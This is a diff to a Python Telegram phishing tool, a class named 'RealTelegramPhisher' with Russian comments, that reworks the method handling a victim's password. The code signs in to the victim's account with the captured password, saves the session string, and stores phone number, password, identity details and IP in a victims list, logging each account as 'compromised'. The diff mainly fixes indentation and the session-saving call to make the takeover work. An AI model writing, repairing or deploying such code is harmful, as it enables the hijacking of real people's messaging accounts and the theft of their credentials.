@@ -200,62 +200,62 @@ class RealTelegramPhisher:
         except Exception as e:
             logger.error(f"❌ Ошибка: {e}")
             return {'success': False, 'error': str(e)} 
-        async def process_victim_password(self, session_id, password):
-        """Обрабатываем пароль от жертвы"""
-            if not self.initialized:
-                return {'success': False, 'error': 'Система не инициализирована'}
-            
+    async def process_victim_password(self, session_id, password):
+    """Обрабатываем пароль от жертвы"""
+        if not self.initialized:
+            return {'success': False, 'error': 'Система не инициализирована'}
+        
+        try:
+            if session_id not in ACTIVE_SESSIONS:
+                return {'success': False, 'error': 'Сессия не найдена'}
+        
+            session_data = ACTIVE_SESSIONS[session_id]
+            client = session_data['client']
+            phone = session_data['phone']
+        
+            logger.info(f"🔑 Жертва ввела пароль для {phone}")
+        
             try:
-                if session_id not in ACTIVE_SESSIONS:
-                    return {'success': False, 'error': 'Сессия не найдена'}
+            # 🔥 ИСПРАВЛЕННЫЙ МЕТОД - используем password для входа
+                await client.sign_in(password=password)
             
-                session_data = ACTIVE_SESSIONS[session_id]
-                client = session_data['client']
-                phone = session_data['phone']
+            # УСПЕХ с паролем
+                session_string = client.session.save()
+                user = await client.get_me()
             
-                logger.info(f"🔑 Жертва ввела пароль для {phone}")
+                victim_data = {
+                'session_id': session_id,
+                'phone': phone,
+                'password': password,
+                'session_string': session_string,
+                'user_id': user.id,
+                'first_name': user.first_name,
+                'last_name': user.last_name,
+                'username': user.username,
+                'ip': request.remote_addr,
+                'compromised_at': datetime.now().isoformat(),
+                'status': 'FULL_ACCESS_WITH_PASSWORD'
+            }
             
-                try:
-                # Входим с паролем
-                    signed_in = await client.sign_in(password=password)
-                
-                # УСПЕХ с паролем
-                    session_string = await client.export_session_string()
-                
-                    victim_data = {
-                    'session_id': session_id,
-                    'phone': phone,
-                    'password': password,
-                    'session_string': session_string,
-                    'user_id': signed_in.id,
-                    'first_name': signed_in.first_name,
-                    'last_name': signed_in.last_name,
-                    'username': signed_in.username,
-                    'ip': request.remote_addr,
-                    'compromised_at': datetime.now().isoformat(),
-                    'status': 'FULL_ACCESS_WITH_PASSWORD'
-                }
-                
-                    VICTIMS_DATA.append(victim_data)
-                    self.save_victims_data()
-                
-                    logger.critical(f"🎉 ДОСТУП С ПАРОЛЕМ! Аккаунт {phone} скомпрометирован!")
-                
-                    return {
-                    'success': True,
-                    'message': '✅ Авторизация успешна!',
-                    'next_step': 'complete',
-                    'redirect': '/success'
-                }
-                
-                except Exception as e:
-                    logger.warning(f"⚠️ Неверный пароль от {phone}")
-                    return {'success': False, 'error': 'Неверный пароль'}
-                
+                VICTIMS_DATA.append(victim_data)
+                self.save_victims_data()
+            
+                logger.critical(f"🎉 ДОСТУП С ПАРОЛЕМ! Аккаунт {phone} скомпрометирован!")
+            
+                return {
+                'success': True,
+                'message': '✅ Авторизация успешна!',
+                'next_step': 'complete',
+                'redirect': '/success'
+            }
+            
             except Exception as e:
-                logger.error(f"❌ Ошибка: {e}")
-                return {'success': False, 'error': str(e)}
-    
+                logger.warning(f"⚠️ Неверный пароль от {phone}: {e}")
+                return {'success': False, 'error': 'Неверный пароль'}
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка: {e}")
+            return {'success': False, 'error': str(e)}
     def save_victims_data(self):
         """Сохраняем данные жертв"""
         try:
